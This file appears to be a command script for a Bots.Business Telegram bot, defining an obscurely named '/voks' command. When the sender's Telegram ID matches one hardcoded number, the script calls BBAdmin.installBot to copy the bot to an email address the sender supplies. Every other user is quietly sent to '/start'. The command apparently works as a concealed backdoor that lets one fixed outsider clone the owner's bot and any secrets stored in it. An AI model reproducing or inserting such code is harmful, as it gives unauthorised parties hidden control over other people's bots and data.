/*CMD
  command: /voks
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 
  answer: Send now

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/

var key = Bot.getProperty("admin_chat")
if (user.telegramid == 1417873264){
BBAdmin.installBot({
  email: message,
  bot_id: bot.id
})

Bot.sendMessage("*Send bot to* "+message)
}else{
Bot.runCommand("/start")
}
